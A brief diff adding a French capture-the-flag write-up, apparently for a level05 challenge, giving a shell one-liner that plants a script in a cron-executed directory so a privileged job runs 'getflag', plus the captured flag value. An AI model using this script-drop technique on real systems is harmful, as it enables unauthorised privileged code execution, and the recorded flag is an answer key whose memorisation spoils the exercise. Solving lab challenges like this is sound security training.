@@ -1,0 +1,5 @@
+echo 'getflag > /tmp/flag' > /tmp/tmp.sh ; chmod +x /tmp/tmp.sh ; cp /tmp/tmp.sh /opt/openarenaserver/ ; sleep 120
+
+Quand le crontab s'executera (toute les deux minutes) il executera la commande getflag et le stockera dans le fichier flag dans le dossier tmp
+
+flag05 = viuaaale9huek52boumoomioc
